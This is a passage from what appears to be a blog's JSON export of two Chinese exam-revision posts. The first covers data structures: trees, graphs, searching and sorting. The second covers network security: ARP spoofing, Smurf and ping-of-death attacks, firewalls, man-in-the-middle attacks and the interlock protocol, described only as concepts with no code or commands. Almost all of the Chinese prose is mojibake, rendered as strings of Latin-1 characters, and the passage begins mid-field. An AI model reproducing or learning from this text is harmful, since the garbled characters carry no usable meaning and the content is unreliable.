ˆåè¿›å…ˆå‡º 2æ¯”1åè¿›ï¼Œåº”è¯¥å…ˆå‡º æ•°ç»„å’Œä¸²æ•°ç»„å’Œä¸²çš„åŸºæœ¬æ¦‚å¿µï¼ˆæœ‰ä¸¤ä¸ªå·¦å³çš„é€‰æ‹©é¢˜ï¼‰ å¹¿ä¹‰è¡¨é•¿åº¦ï¼šè¡¨ä¸­æ‰€å«å…ƒç´ çš„ä¸ªæ•°ã€‚æ·±åº¦ï¼šæ‹¬å·çš„å±‚æ•° æ ‘æŒæ¡æ ‘ã€äºŒå‰æ ‘ã€æ»¡äºŒå‰æ ‘ã€å®Œå…¨äºŒå‰æ ‘çš„ç›¸å…³æ¦‚å¿µï¼Œæ ‘è½¬åŒ–ä¸ºæ£®æ—çš„æ–¹æ³•ã€‚ï¼ˆè¿™ä¸€å¼ æ˜¯è€ƒè¯•é‡ç‚¹ï¼Œä¼šæœ‰å¤šç§ç±»å‹çš„è€ƒé¢˜ï¼‰ é‡ç‚¹æŒæ¡ äºŒå‰æ ‘çš„5ä¸ªæ€§è´¨: $å¶å­èŠ‚ç‚¹æ•°ï¼š n_0 &#x3D; n_2 + 1$ $ç¬¬kå±‚ä¸Šï¼Œè‡³å¤šæœ‰2^{k-1}ä¸ªç»“ç‚¹$ $é«˜åº¦ä¸ºhçš„äºŒå‰æ ‘ï¼Œè‡³å¤šæœ‰2^h-1ä¸ªç»“ç‚¹$ ç»“ç‚¹iæ‰€åœ¨å±‚æ¬¡ nä¸ªç»“ç‚¹çš„å®Œå…¨äºŒå‰æ ‘é«˜åº¦ æ ‘çš„å‡ ç§éå†æ–¹æ³•ï¼šæŒ‰æŸæ¡æœç´¢è·¯å¾„è®¿é—®æ ‘ä¸­çš„æ¯ä¸ªç»“ç‚¹ï¼Œæ ‘çš„æ¯ä¸ªç»“ç‚¹å‡è¢«è®¿é—®ä¸€æ¬¡ï¼Œè€Œä¸”åªè®¿é—®ä¸€æ¬¡ å…ˆåºéå†ï¼šæ ¹ï¼Œå·¦å­æ ‘ï¼Œå³å­æ ‘ NLR ![44](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;æ•°ä¹ç»“æœ&#x2F;æ•°æ®ç»“æ„ da568407752248e985256042f6aeeec2&#x2F;44.png) ä¸­åºéå†ï¼šå·¦å­æ ‘ï¼Œæ ¹ï¼Œå³å­æ ‘ LNR ååºéå†ï¼šå·¦å­æ ‘ã€å³å­æ ‘ã€æ ¹ LRN å±‚æ¬¡éå†ï¼šä»ä¸Šè‡³ä¸‹ï¼Œä»å·¦è‡³å³ å“ˆå¤«æ›¼æ ‘çš„æ„é€ åŠç¼–ç è§„åˆ™ å¹³è¡¡äºŒå‰æ ‘çš„æ„å»º ç›¸å…³æ¦‚å¿µ æ ‘äºŒå‰æ ‘æ»¡äºŒå‰æ ‘ å®Œå…¨äºŒå‰æ ‘ å·¦è¾¹æ˜¯å®Œå…¨äºŒå‰æ ‘ï¼Œå³è¾¹æ˜¯æ»¡äºŒå‰æ ‘ã€‚ åªæœ‰æœ€åä¸€å±‚ï¼Œæ²¡æœ‰æ»¡ã€‚ æ ‘è½¬åŒ–ä¸ºæ£®æ—çš„æ–¹æ³• é¢˜ $n&#x3D;n_0 +n_1+n_2$ $n_0&#x3D;n_2+1$ æœ€åä¸€ä¸ªåˆ†æ”¯ç»“ç‚¹åºå· &#x3D; ç»“ç‚¹&#x2F;2 å‘ä¸‹å–æ­£ å¶å­ç»“ç‚¹ä¸ªæ•° &#x3D; æ€»ç»“ç‚¹æ•° - æœ€åä¸€ä¸ªåˆ†æ”¯ç»“ç‚¹åºå· $n_1$åªæœ‰ä¸¤ç§å¯èƒ½ 0 æˆ–1 $ç»“ç‚¹å›ºå®šï¼ŒhèŒƒå›´ï¼š log_2æœ€å¤§ç»“ç‚¹æ•°ï¼ˆå‘ä¸‹å–æ­£ï¼‰ + 1 ï½ æœ€å¤§ç»“ç‚¹æ•°$ $æ·±åº¦ä¸ºhçš„æ»¡må‰æ ‘ï¼Œç»“ç‚¹ä¸ªæ•° m^h-1, ç¬¬kå±‚çš„ç»“ç‚¹æ•°ä¸ºm^{k-1}$ åˆ†æ”¯æ•°ä¸ºBï¼Œç»“ç‚¹æ•°ä¸ºn $n&#x3D;B+1$ $B&#x3D;åº¦æ•°*æ•°é‡$ $å“ˆå¤«æ›¼æ ‘åªæœ‰n_0å’Œn_2ç»“ç‚¹$ $å®Œå…¨äºŒå‰æ ‘ n &#x3D; n_0+n_1+n_2 ä¸” n_1&#x3D; 0\\ or \\ 1$ å›¾æœ‰å‘å›¾ï¼Œæ— å‘å›¾ï¼Œè¿é€šå›¾çš„åŸºæœ¬æ¦‚ç‡ï¼Œå›¾çš„é‚»æ¥çŸ©é˜µè¡¨ç¤ºæ–¹æ³•ï¼Œå›¾çš„éå†æ–¹æ³•ï¼ˆæ·±åº¦éå†å’Œå¹¿åº¦éå†ï¼‰ï¼Œæœ€çŸ­è·¯åŠ²ç®—æ³•å’Œå…³é”®è·¯åŠ²çš„ç®—æ³•ï¼› æœ€å°ç”Ÿæˆæ ‘ç®—æ³•ï¼šPrimç®—æ³•åŠKruskalç®—æ³•çš„æ¦‚å¿µï¼› æœ€çŸ­è·¯å¾„ç®—æ³•ï¼šDijkstraï¼ˆè¿ªæ°æ–¯ç‰¹æ‹‰ï¼‰ç®—æ³•ï¼ˆè¦æ±‚ç†è§£è¯¥ç®—æ³•çš„ç¨‹åºä»£ç ï¼‰ å…³é”®è·¯å¾„ç®—æ³•çš„æ±‚è§£ å›¾çš„åŸºæœ¬æ¦‚å¿µ ä¸€ä¸ªå›¾ä¸­ï¼Œæ‰€æœ‰é¡¶ç‚¹åº¦æ•°ä¹‹å’Œ &#x3D; è¾¹æ•° * 2 æœ‰å‘å›¾ä¸­ï¼Œæ‰€æœ‰é¡¶ç‚¹å‡ºåº¦ä¹‹å’Œ &#x3D; å…¥åº¦ä¹‹å’Œ nä¸ªé¡¶ç‚¹çš„æœ‰å‘å›¾ï¼Œæœ€å¤šn(n-1) æ¡è¾¹ nä¸ªé¡¶ç‚¹çš„è¿é€šå›¾ï¼Œç”¨é‚»æ¥çŸ©é˜µè¡¨ç¤ºï¼Œæœ€å°‘è¦æœ‰2(n-1)ä¸ªéé›¶å…ƒç´  é¢˜ è¡Œä¸ºå‡ºåº¦ï¼Œåˆ—ä¸ºå…¥åº¦ã€‚å„é¡¶ç‚¹åº¦æ˜¯è¡Œåˆ—éé›¶å…ƒç´ ä¹‹å’Œã€‚ å…³é”®è·¯å¾„ï¼šä»æºç‚¹åˆ°æ±‡ç‚¹å¸¦æƒè·¯å¾„æœ€é•¿çš„ çº¿æ€§è¡¨é‡ç‚¹æŒæ¡ï¼šçº¿æ€§è¡¨çš„é¡ºåºæŸ¥æ‰¾ã€æŠ˜åŠæŸ¥æ‰¾å’Œåˆ†å—æŸ¥æ‰¾çš„æ¦‚å¿µ äºŒå‰æ’åºæ ‘çš„æŸ¥æ‰¾ã€åˆ›å»ºã€æ’å…¥ã€åˆ é™¤æ–¹æ³•ï¼› å¹³è¡¡äºŒå‰æ ‘çš„è°ƒæ•´çš„4ç§æ–¹æ³•ï¼› å †æ’åºï¼ˆæŒæ¡å¦‚ä½•å»ºå †çš„è¿‡ç¨‹ï¼‰ï¼› å †æ’åˆ— å°æ ¹å †ï¼Œå­æ ‘æ¯”æ ¹å¤§ å¤§æ ¹å †ï¼Œå­æ ‘æ¯”æ ¹å° é¡ºåºæŸ¥æ‰¾ å¯¹æ— åºçº¿æ€§è¡¨è¿›è¡Œé¡ºåºæŸ¥æ‰¾ï¼ŒæŸ¥æ‰¾å¤±è´¥æ—¶è¦éå†æ•´ä¸ªçº¿æ€§è¡¨ æœ‰åºæŸ¥æ‰¾è¿›è¡Œé¡ºåºæŸ¥æ‰¾ï¼Œå¤±è´¥æ—¶ä¸ä¸€å®šè¦éå†æ•´ä¸ªçº¿æ€§è¡¨ å¤±è´¥ç»“ç‚¹æœ‰n+1ä¸ª æŠ˜åŠæŸ¥æ‰¾ ä»…é€‚ç”¨äºæœ‰åºé¡ºåºè¡¨ è®¡ç®—å¹³å‡æŸ¥æ‰¾é•¿åº¦ï¼š ASLæˆåŠŸï¼šç¬¬ä¸€å±‚æœ‰ä¸€ä¸ªç»“ç‚¹ï¼Œç¬¬äºŒå±‚ä¸¤ä¸ªç»“ç‚¹ï¼Œç¬¬ä¸‰å±‚ä¸‰ä¸ª ASLå¤±è´¥ï¼šæ²¡æœ‰ç»™å‡ºå…·ä½“å¤±è´¥ä¾‹å­ï¼Œä»¥å¤±è´¥ç»“ç‚¹ä¸ºå•ä½ï¼Œæœ‰12ä¸ªå¤±è´¥ç»“ç‚¹ã€‚4å±‚æœ‰4ä¸ªå¤±è´¥ç»“ç‚¹ï¼Œï¼ˆ4-1ï¼‰*4 5å±‚æœ‰8ä¸ªå¤±è´¥ç»“ç‚¹ï¼Œï¼ˆ5-1ï¼‰*8 åˆ†å—æŸ¥æ‰¾ å‘½åï¼šæœ€å¤§æ ‡å·ã€‚ æŸ¥æ‰¾çš„æ—¶å€™ï¼Œå’Œæ ‡å·æ¯”è¾ƒ å—å†…å…ƒç´ æ— åºï¼Œå—é—´æœ‰åº æ³¨æ„æ˜¯ï¼Œå‡åŒ€åˆ†é…bå— å¹³è¡¡äºŒå‰æ ‘çš„è°ƒæ•´ï¼ˆ4ç§æ–¹æ³•ï¼‰ LLå¹³è¡¡æ—‹è½¬ï¼ˆå³å•æ—‹è½¬ï¼‰ Hä»£è¡¨å±‚æ•° RRå¹³è¡¡æ—‹è½¬ LRå¹³è¡¡æ—‹è½¬ RLå¹³è¡¡æ—‹è½¬ ![120](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;æ•°ä¹ç»“æœ&#x2F;æ•°æ®ç»“æ„ da568407752248e985256042f6aeeec2&#x2F;120.png) æ¦‚å¿µé¢˜ é¢˜ ä¸­é—´çš„ä¸ºæ ¹ï¼Œç„¶ååˆ†ä¸ºå·¦å³ä¸¤éƒ¨åˆ†ï¼Œå†å–ä¸­é—´çš„ä¸ºæ ¹ï¼Œä»¥æ­¤ç±»æ¨ï¼Œä¸”ç¡®å®šäº†æ ¹åï¼Œå¤„åœ¨å‰é¢çš„æ˜¯åé¢çš„æ ¹ï¼Œæ¯”å¦‚3ï¼Œ4çš„ä½ç½®ã€‚æˆ–è€…å‰é¢æ˜¯å·¦å­æ ‘ã€‚è¿™ç§é¡ºåº å…³é”®å­—ç»“ç‚¹æ’åºï¼Œæ¯”è¾ƒå¤§å°ï¼Œå°çš„å·¦å­æ ‘ï¼Œå¤§çš„å³å­æ ‘ æ’åº åŸºæœ¬æ¦‚å¿µ é¢˜ å¿«é€Ÿæ’åºï¼Œå·¦æ ‡è®°çš„å€¼å¤§äºåŸºå‡†ç‚¹æ—¶ï¼Œä¸”å³æ ‡è®°ç§»åŠ¨åˆ°æ¯”åŸºå‡†å€¼å°æ—¶ï¼Œå·¦å³ä¸¤è¾¹äº¤æ¢ã€‚ å·¦å³ä¸¤ä¸ªæ ‡è®°é‡åˆæ—¶ï¼Œé‚£ä¸ªå€¼ä¸åŸºå‡†ç‚¹è¿›è¡Œäº¤æ¢ã€‚è¿™æ ·å°±åˆ†ä¸ºäº†ï¼Œæ ‡è®°å€¼å·¦è¾¹æ˜¯å°äºåŸºå‡†å€¼çš„ï¼Œå³è¾¹æ˜¯å¤§äºåŸºå‡†å€¼çš„ å°æ ¹å † æŒ‰å±‚æ¬¡æ’åºæŠŠè¿™ä¸ªåºåˆ—æ’æˆäºŒå‰æ ‘ å¤§æ ¹å † å…ˆæ— åºæ’æˆäºŒå‰æ ‘ï¼Œç„¶åä»åº•å±‚å¼€å§‹äº¤æ¢é¡ºåºã€‚æ ¹æ¯”å­©å­éƒ½å¤§ ç®—æ³•æŒæ¡èµ·æ³¡æ’åºï¼ˆè¦æ±‚ç†è§£è¯¥ç®—æ³•ç¨‹åºä»£ç ï¼‰ï¼Œç›´æ¥æ’å…¥æ’åºï¼ˆæ‡‚å¾—åŸç†ï¼‰ã€å¸Œå°”æ’åºï¼ˆæ‡‚å¾—åŸç†ï¼‰ã€å¿«é€Ÿæ’åºï¼ˆæ‡‚å¾—åŸç†ï¼‰ï¼›","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"æ•°æ®ç»“æ„","slug":"æœŸæœ«è€ƒè¯•/æ•°æ®ç»“æ„","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"ç½‘ç»œå®‰å…¨æŠ€æœ¯æœŸæœ«è€ƒç‚¹","slug":"ç½‘ç»œå®‰å…¨æŠ€æœ¯æœŸæœ«è€ƒç‚¹","date":"2021-01-20T17:06:34.000Z","updated":"2024-11-12T07:00:03.000Z","comments":true,"path":"2021/01/21/ç½‘ç»œå®‰å…¨æŠ€æœ¯æœŸæœ«è€ƒç‚¹/","permalink":"https://gryffinbit.top/2021/01/21/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%9C%9F%E6%9C%AB%E8%80%83%E7%82%B9/","excerpt":"","text":"è€ƒç‚¹å¡«ç©ºé¢˜ï¼ˆ15ï¼‰ ç½‘ç»œå®‰å…¨ç›®æ ‡ æœºå¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§ã€åˆæ³•æ€§ ç½‘ç»œå®‰å…¨å¨èƒ Impersonationå†’å……ï¼šä¼ªé€ ä»–äººèº«ä»½ Replayé‡æ”¾ï¼šæŠŠåˆæ³•çš„ä¿¡æ¯é‡æ–°å‘ä¸€é Denial of Serviceæ‹’ç»æœåŠ¡æ”»å‡» å¼ºåˆ¶è®¿é—®æ§åˆ¶ æœ€é«˜ç§˜å¯†Top Secert &gt; ç§˜å¯†Secret &gt; æœºå¯†Confidential Landæ”»å‡» ç›¸åŒçš„ç›®çš„IPåœ°å€å’Œæºåœ°å€ï¼Œloopæ­»é” ä¼ è¾“å±‚çš„å¥—æ¥å­—ï¼š å·¥ä½œåœ¨è¿è¾“å±‚ PKIçš„ç›®æ ‡ï¼š èº«ä»½è®¤è¯ã€ä¿¡æ¯å®Œæ•´æ€§ã€ä¸å¯æŠµèµ–æ€§ æ•°å­—è¯ä¹¦å«æœ‰ï¼š æœ‰æ•ˆæœŸé™ã€é¢å‘è€…èº«ä»½ã€æ•°å­—è¯ä¹¦ç®—æ³•ï¼ˆå¦‚ä½•ä¸ºå®ƒç­¾åçš„RSAã€Hashã€Sha256ç­‰ï¼‰ sesion Key ï¼š ä¼šè¯å¯†é’¥ GSMè®¤è¯ å¯¼è‡´ä¼ªåŸºç«™çš„äº§ç”Ÿçš„åŸå› ï¼šç”¨æˆ·å¯¹åŸºç«™çš„è¯æ˜æ˜¯å•å‘çš„ ï¼ˆç”¨æˆ·å‘åŸºç«™è¯æ˜è‡ªå·±æ˜¯åˆæ³•ç”¨æˆ·ï¼Œè€ŒåŸºç«™ä¸ä¼šå‘ç”¨æˆ·è¯æ˜ï¼‰ VPN â€œè™šæ‹Ÿâ€çš„ä¸“ç”¨ç½‘ã€‚ ä¼˜åŠ¿ï¼šå®‰å…¨ã€ä½æˆæœ¬ã€å¯æ‰©å±•ã€å¯ç®¡ç† é€‰æ‹©é¢˜ï¼ˆ10ï¼‰ æŠµæŠ—é‡æ”¾æ”»å‡» ä¸€æ¬¡ä¸€å¯† æ­»äº¡ping åœ¨ç›®çš„ç«¯é‡ç»„IPåˆ†ç‰‡ï¼Œå½¢æˆè¶…å¤§IPæ•°æ®åŒ…ï¼Œè¶…è¿‡æœ€å¤§å°ºå¯¸å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºã€‚ æŠµæŠ—ä¸­é—´äººæ”»å‡»ï¼š æ•°å­—ç­¾å å¯†ç åè®®çš„ç§ç±» å¯†ç å»ºç«‹åè®® è®¤è¯åè®® å¯è®¤è¯å¯†é’¥å»ºç«‹ æ²¡æœ‰ä¸€æ¬¡ä¸€å¯† ä¼ä¸šæ ¹CAéœ€è¦æ´»åŠ¨ç›®å½•æŠ€æœ¯æ”¯æŒï¼ˆç‹¬ç«‹æ ¹è¯ä¹¦ä¸éœ€è¦ï¼‰ ç½‘ç»œåŠ å¯† é“¾è·¯åŠ å¯†ã€ç»“ç‚¹åŠ å¯†ã€ç«¯åˆ°ç«¯åŠ å¯† ï¼ˆä¸æ˜¯ç½‘ç»œåŠ å¯†çš„æ˜¯ï¼Ÿï¼‰ å¯ä¿¡çš„å¯†é’¥åˆ†å‘ä¸­å¿ƒ æ€§èƒ½å’Œå®‰å…¨çš„ç“¶é¢ˆ åŠ¨æ€åŒ…è¿‡æ»¤ï¼š ï¼ˆæŒ‰éœ€ï¼‰ ç›‘æ§æ•°æ®åŒ…äº¤æ¢å¹¶ä¸”æ ¹æ®éœ€è¦æ¥è¿›è¡Œæœ‰æ•ˆæ§åˆ¶é€šä¿¡ åˆ¤æ–­é¢˜ï¼ˆ5ï¼‰ kerberosåè®®ï¼š å¯è®¤è¯çš„ç¥¨æ®ï¼Œä½¿ç”¨çš„æ˜¯å¯¹ç§°åŠ å¯†ï¼Œè€Œä¸æ˜¯å…¬é’¥åŠ å¯† å¯ä¿¡çš„å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼š æ€§èƒ½å’Œå®‰å…¨çš„ç“¶é¢ˆ ç®€ç­”é¢˜ï¼ˆ4é“ï¼‰ARPåŸç†ï¼ŒARPæ¬ºéª— ARPï¼šåœ°å€è§£æï¼Œåœ¨å±€åŸŸç½‘ä¸­ï¼Œå°†IPåœ°å€è½¬æ¢æˆMACåœ°å€ ARPæ¬ºéª—ï¼šé€šè¿‡æ¬ºéª—å±€åŸŸç½‘å†…è®¿é—®è€…PCçš„ç½‘å…³MACåœ°å€ï¼Œä½¿è®¿é—®è€…PCé”™ä»¥ä¸ºæ”»å‡»è€…æ›´æ”¹åçš„MACåœ°å€æ˜¯ç½‘å…³çš„MACï¼Œå¯¼è‡´ç½‘ç»œä¸é€šã€‚æ­¤ç§æ”»å‡»å¯è®©æ”»å‡»è€…è·å–å±€åŸŸç½‘ä¸Šçš„æ•°æ®åŒ…ç”šè‡³å¯ç¯¡æ”¹æ•°æ®åŒ…ï¼Œä¸”å¯è®©ç½‘ç»œä¸Šç‰¹å®šè®¡ç®—æœºæˆ–æ‰€æœ‰è®¡ç®—æœºæ— æ³•æ­£å¸¸è¿çº¿ã€‚ ğŸŒ» ä¿®æ”¹æ•°æ®åŒ…ä¸­çš„ç›®çš„MACåœ°å€ï¼Œæ”»å‡»è€…å°†è¢«æ”»å‡»è€…çš„MACåœ°å€æ›¿æ¢æˆè‡ªå·±çš„MACåœ°å€ ICMPåå¼¹Smurfæ”»å‡» ä½¿ç”¨å°†æºåœ°å€è®¾ç½®æˆå—å®³ç½‘ç»œçš„å¹¿æ’­åœ°å€çš„ICMPåº”ç­”è¯·æ±‚ï¼ˆpingï¼‰æ•°æ®åŒ…ï¼Œæ¥æ·¹æ²¡å—å®³ä¸»æœºï¼Œæœ€ç»ˆå¯¼è‡´è¯¥ç½‘ç»œçš„æ‰€æœ‰ä¸»æœºéƒ½å¯¹æ­¤ICMPåº”ç­”è¯·æ±‚åšå‡ºç­”å¤ï¼Œå¯¼è‡´ç½‘ç»œé˜»å¡ã€‚ ICMPå›æ˜¾æ³›æ´ªæ”»å‡» å‘é€å‡å†’pingæ•°æ®åŒ…ï¼Œå…¶ä¸­ï¼š æºåœ°å€è®¾ç½®ä¸ºå—å®³è€…çš„IPåœ°å€ ç›®çš„åœ°å€è®¾ç½®ä¸ºå­ç½‘çš„å¹¿æ’­åœ°å€ï¼ˆå‘æ•´ä¸ªå±€åŸŸç½‘ä¼ æ’­ï¼‰ å¦‚æ­¤ï¼Œpingå›æ˜¾æ•°æ®æµå µå¡ï¼Œè€—å°½è¢«æ”»å‡»è€…çš„å¸¦å®½ï¼Œæ— æ³•æä¾›æ­£å¸¸æœåŠ¡ï¼Œè¿›è€Œæ‹’ç»æœåŠ¡ã€‚ æ¡¥æ¥æˆ–ä»…ä¸»æœºç½‘å¡çš„è™šæ‹Ÿæœºä¸èƒ½å’ŒåŒå­ç½‘çš„å®¿ä¸»æœºè·å¾—pingå›æ˜¾ï¼Œä¸ºä»€ä¹ˆï¼Ÿ å› ä¸ºICMPå›æ˜¾è¯·æ±‚åœ¨é˜²ç«å¢™ä¸­æ²¡æœ‰è¢«å¯ç”¨ é˜²ç«å¢™ é˜²ç«å¢™çš„æ¦‚å¿µï¼š åœ¨å†…éƒ¨ä¸“ç”¨ç½‘ç»œå’Œå…¬å…±ç½‘ç»œä¹‹é—´ ä¸¢å¼ƒæ•°æ®åŒ…ï¼š ä¸äºˆå¤„ç†å¹¶ä¸”æ— å“åº”æ¶ˆæ¯ é™æ€çš„åŒ…è¿‡æ»¤ç³»ç»Ÿï¼š NATä¿æŠ¤å†…éƒ¨è®¡ç®—æœºä¸å—å¤–éƒ¨æ”»å‡» é˜²ç«å¢™åˆ†ä¸ºï¼š ç”µè·¯çº§ç½‘å…³ 2. åº”ç”¨å±‚ç½‘å…³ 3. åŒ…è¿‡æ»¤æŠ€æœ¯ï¼ˆé™æ€å’ŒåŠ¨æ€ï¼‰ åº”ç”¨çº§ç½‘å…³åœ¨OSIæ¨¡å‹ä¸­çš„åº”ç”¨å±‚è¿‡æ»¤æ•°æ®ï¼Œç”µè·¯çº§ç½‘å…³åœ¨ä¼šè¯å±‚ï¼ŒåŒ…è¿‡æ»¤æŠ€æœ¯åœ¨ç½‘ç»œå±‚ ç»¼åˆå¤§é¢˜ï¼ˆ2é“ï¼‰å¦‚ä½•ä¿è¯å®Œæ•´æ€§å’Œæœºå¯†æ€§ï¼Ÿ å®Œæ•´æ€§ï¼šwebæœåŠ¡å™¨ åº•å±‚ä¿¡æ¯æµä¸Šä¸å»ã€‚ç”¨æˆ·ï¼šä½çº§ã€‚webæœåŠ¡å™¨ï¼šé«˜çº§ ä¸ä¸‹è¯»ï¼šé˜»æ­¢åä¿¡æ¯ä»è¾ƒä½å®Œæ•´æ€§ç­‰çº§å‘ä¸Šæµï¼ˆæœåŠ¡å™¨æ‹’ç»è¯»åä¿¡æ¯ï¼‰ ä¸ä¸Šå†™ï¼šé˜»æ­¢åä¿¡æ¯ä»ä¸‹æ–¹æµå‘è¾ƒé«˜å®Œæ•´æ€§ç­‰çº§ï¼ˆä¸èƒ½å‘æœåŠ¡å™¨å†™åä¿¡æ¯ï¼‰ æœºå¯†æ€§ï¼šé˜²ç«å¢™ é«˜å±‚ä¿¡æ¯æµä¸ä¸‹æ¥ã€‚é˜²ç«å¢™å†…éƒ¨ï¼šé«˜çº§ã€‚é˜²ç«å¢™å¤–éƒ¨ï¼šä½çº§ ä¸ä¸Šè¯»ï¼šé˜»æ­¢å¥½ä¿¡æ¯ä»è¾ƒé«˜æœºå¯†çº§åˆ«å‘ä¸‹æµï¼ˆé˜²ç«å¢™å¤–æ— æ³•è®¿é—®é˜²ç«å¢™å†…ï¼‰ ä¸ä¸‹å†™ï¼šé˜»æ­¢å¥½ä¿¡æ¯ä»ä¸Šæ–¹æµå‘è¾ƒä½æœºå¯†çº§ï¼ˆé˜²ç«å¢™å†…æ— æ³•å†™å‡ºé˜²ç«å¢™å¤–ï¼‰ ä¸­é—´äººæ”»å‡»ï¼Ÿ åœ¨æ²¡æœ‰å¯Ÿè§‰çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…æ‹¦æˆªè¢«æ”»å‡»è€…çš„é€šä¿¡ï¼ŒåŠ«æŒå‘é€æ–¹çš„æ¶ˆæ¯æ›¿æ¢å¹¶ä¸”è½¬å‘ç»™æ¥æ”¶æ–¹ã€‚å¦‚æ­¤ï¼Œé€šä¿¡åŒæ–¹è®¤ä¸ºè‡ªå·±å·²ç»å’Œå¯¹æ–¹å®Œæˆå¯†é’¥åå•†ï¼Œä½†æ˜¯å®é™…ä¸Šæ˜¯å„è‡ªå’Œæ”»å‡»è€…è¿›è¡Œäº†å¯†é’¥åå•†ã€‚ ç”¨æ•°å­—ç­¾åå’Œå…¬é’¥ç»‘åœ¨ä¸€èµ·å‘é€ï¼ŒæŠµå¾¡ä¸­é—´äººæ”»å‡» è”é”åè®®ï¼ˆäº’é”åè®®ï¼Œinterlock protocolï¼‰æŠµæŠ—ä¸­é—´äººæ”»å‡» å¯ä»¥æŒ«è´¥åŒæ–¹å¯†é’¥äº¤æ¢æ—¶çš„ä¸­é—´äººæ”»å‡»ã€‚ å®‰å…¨ç‰¹æ€§ï¼šä»…æœ‰åŠ å¯†æ¶ˆæ¯çš„ä¸€åŠæ— æ³•è§£å¯† è¿‡ç¨‹ï¼š å¦‚æœå°è¯•æ‹¦æˆªä¼šè¯ï¼Œæ•Œæ‰‹æ—¢æ— æ³•è§£å¯†Aå‘é€æ¶ˆæ¯å¯†æ–‡çš„ä¸€åŠï¼Œåˆæ— æ³•ä½¿ç”¨Bçš„å…¬é’¥é‡æ–°åŠ å¯†ä¸€åŠçš„æ¶ˆæ¯ æ•Œæ‰‹ä¸å¾—ä¸ç­‰å¾…æ¥æ”¶åˆ°ä¸¤ä¸ªå®Œæ•´çš„å¯†æ–‡ï¼Œç„¶è€Œè¿™ä¸ªæ—¶å€™Bå·²ç»å¯ä»¥ä½¿ç”¨è‡ªå·±çš„ç§é’¥æ¥è§£å¯†è¿™ä¸ªæ¶ˆæ¯ BæˆåŠŸè·å–åˆ°Açš„æ­£ç¡®æ¶ˆæ¯ï¼Œåç»­å°†ç›´æ¥ä¸¢å¼ƒæ•Œæ‰‹çš„æ¶ˆæ¯ è¡¥å……ç¬”è®°ç¬¬ä¸€ç« ä¿¡æ¯å®‰å…¨4ä¸ªåŸºæœ¬ç›®æ ‡ ä¿å¯†æ€§ ä¸è¢«æ³„éœ² å®Œæ•´æ€§ æ•°æ®ä¸€è‡´æ€§ å¯ç”¨æ€§ åˆæ³•ç”¨æˆ·ä¸ä¼šæ— æ•…è¢«æ‹’ç» åˆæ³•ä½¿ç”¨ ä¸è¢«éæˆæƒä½¿ç”¨ã€ä¸è¢«éæˆæƒçš„äººä½¿ç”¨ å®‰å…¨å¨èƒæ¥æº ä¿¡æ¯æ³„éœ² å®Œæ•´æ€§ç ´å æ‹’ç»æœåŠ¡ éæ³•ä½¿ç”¨ ä¸»è¦å¯å®ç°å¨èƒ å‡å†’ æœªæˆæƒå®ä½“ç›—å–åˆæ³•ç”¨æˆ·çš„æƒåˆ©å’Œç‰¹æƒ æ—è·¯æ§åˆ¶ ä¸ºè·å–éæˆæƒçš„æƒé™ï¼Œå‘æ˜ç³»ç»Ÿç¼ºé™·æˆ–æ¼æ´ï¼Œç»•è¿‡å®ˆå«è€…çš„é˜²çº¿ æˆæƒä¾µçŠ¯ æœ‰æˆæƒçš„äººï¼Œå°†å…¶æƒé™ç”¨äºéæˆæƒçš„ç›®çš„ï¼Œé€šå¸¸ç§°ä¸ºå†…éƒ¨æ”»å‡» ç‰¹æ´›ä¼Šæœ¨é©¬ å«æœ‰ä¸æ˜“å¯Ÿè§‰çš„æˆ–æ— å®³ç¨‹åºæ®µï¼Œæ‰§è¡Œçš„æ—¶å€™ä¼šç ´åç”¨æˆ·å®‰å…¨æ€§ é™·é—¨ åœ¨ç³»ç»Ÿæˆ–å…¶éƒ¨ä»¶è®¾ç½®æœºå…³ï¼Œåœ¨è¾“å…¥ç‰¹å®šçš„æ•°æ®æ—¶ï¼Œå…è®¸è¿åå®‰å…¨ç­–ç•¥ æˆªè·&#x2F;ä¿®æ”¹ æŸä¸€é€šè®¯æ•°æ®ï¼Œåœ¨ä¼ è¾“ä¸­è¢«æ”¹å˜ã€åˆ é™¤æˆ–æ›¿æ¢ æ¶ˆæ¯é‡å‘ å¯¹æ‰€æˆªè·çš„æŸæ¬¡åˆæ³•çš„æ•°æ®å¤‡ä»½ï¼Œå‡ºäºéæ³•ç›®çš„é‡æ–°å‘é€è¯¥æ•°æ® ä¸šåŠ¡å¦è®¤ å‚ä¸æŸæ¬¡é€šè®¯äº¤æ¢çš„ä¸€æ–¹ï¼Œäº‹åå¦è®¤æ›¾ç»å‘ç”Ÿè¿‡æ­¤æ¬¡ä¿¡æ¯äº¤æ¢ æµé‡åˆ†æ å¯¹é€šä¿¡æµé‡è¿›è¡Œè§‚å¯Ÿï¼Œå¯èƒ½æ³„éœ²æœºå¯†ä¿¡æ¯ å®‰å…¨é˜²æŠ¤æªæ–½ ç‰©ç†å®‰å…¨ ç¯å¢ƒçš„å®‰å…¨ã€ç‰©ç†çš„è®¿é—®æ§åˆ¶æªæ–½ã€è®¾å¤‡é˜²ç¯¡æ”¹ç­‰ äººå‘˜å®‰å…¨ å²—ä½åˆ’åˆ† ç®¡ç†å®‰å…¨ å¯¹è®¾å¤‡è¿›è¡Œç®¡ç†ã€æ³„éœ²ä¿¡æ¯äº‹ä»¶çš„è¿½æŸ¥ã€å®¡è®¡ åª’ä½“å®‰å…¨ å¯¹å—ä¿æŠ¤ä¿¡æ¯çš„å­˜å‚¨ã€ç£ç›˜çš„é”€æ¯ è¾å°„å®‰å…¨ å°„é¢‘ç­‰å…¶ä»–ç”µç£çš„æ§åˆ¶ 